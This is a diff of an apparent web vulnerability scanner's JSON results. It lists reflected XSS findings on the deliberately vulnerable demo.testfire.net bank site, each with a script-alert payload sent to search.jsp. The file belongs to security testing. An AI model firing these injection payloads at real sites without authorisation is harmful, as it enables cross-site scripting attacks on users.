@@ -1,17 +1,7 @@
 [
     {
         "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp",
+        "url": "https://demo.testfire.net/index.jsp?content=personal.htm",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
         "method": "get",
@@ -41,7 +31,37 @@
     },
     {
         "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/feedback.jsp",
+        "url": "https://demo.testfire.net/",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=business.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=inside.htm",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
         "method": "get",
@@ -67,87 +87,7 @@
     },
     {
         "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=personal.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=business.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=inside.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=personal_deposit.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=personal_checking.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=personal_loans.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=personal_cards.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=personal_investments.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=personal_other.htm",
+        "url": "https://demo.testfire.net/feedback.jsp",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
         "method": "get",
@@ -167,6 +107,16 @@
     },
     {
         "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=personal_checking.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
         "url": "https://demo.testfire.net/index.jsp?content=business_lending.htm",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
@@ -177,7 +127,97 @@
     },
     {
         "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=personal_cards.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=personal_other.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=personal_loans.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=personal_investments.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=personal_deposit.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
         "url": "https://demo.testfire.net/index.jsp?content=business_cards.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/subscribe.jsp",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=inside_press.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=inside_investor.htm",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/index.jsp?content=inside_careers.htm",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
         "method": "get",
@@ -207,16 +247,6 @@
     },
     {
         "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=business_other.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
         "url": "https://demo.testfire.net/index.jsp?content=inside_about.htm",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
@@ -227,47 +257,7 @@
     },
     {
         "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=inside_investor.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=inside_press.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=inside_careers.htm",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/subscribe.jsp",
-        "payload": "<script>alert('Crucible-XSS')</script>",
-        "endpoint": "https://demo.testfire.net/search.jsp",
-        "method": "get",
-        "data": {
-            "query": "<script>alert('Crucible-XSS')</script>"
-        }
-    },
-    {
-        "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/index.jsp?content=personal_savings.htm",
+        "url": "https://demo.testfire.net/index.jsp?content=business_other.htm",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
         "method": "get",
@@ -297,6 +287,16 @@
     },
     {
         "vulnerability type": "Reflected XSS",
+        "url": "https://demo.testfire.net/status_check.jsp",
+        "payload": "<script>alert('Crucible-XSS')</script>",
+        "endpoint": "https://demo.testfire.net/search.jsp",
+        "method": "get",
+        "data": {
+            "query": "<script>alert('Crucible-XSS')</script>"
+        }
+    },
+    {
+        "vulnerability type": "Reflected XSS",
         "url": "https://demo.testfire.net/index.jsp?content=security.htm",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
@@ -307,7 +307,7 @@
     },
     {
         "vulnerability type": "Reflected XSS",
-        "url": "https://demo.testfire.net/status_check.jsp",
+        "url": "https://demo.testfire.net/index.jsp?content=personal_savings.htm",
         "payload": "<script>alert('Crucible-XSS')</script>",
         "endpoint": "https://demo.testfire.net/search.jsp",
         "method": "get",
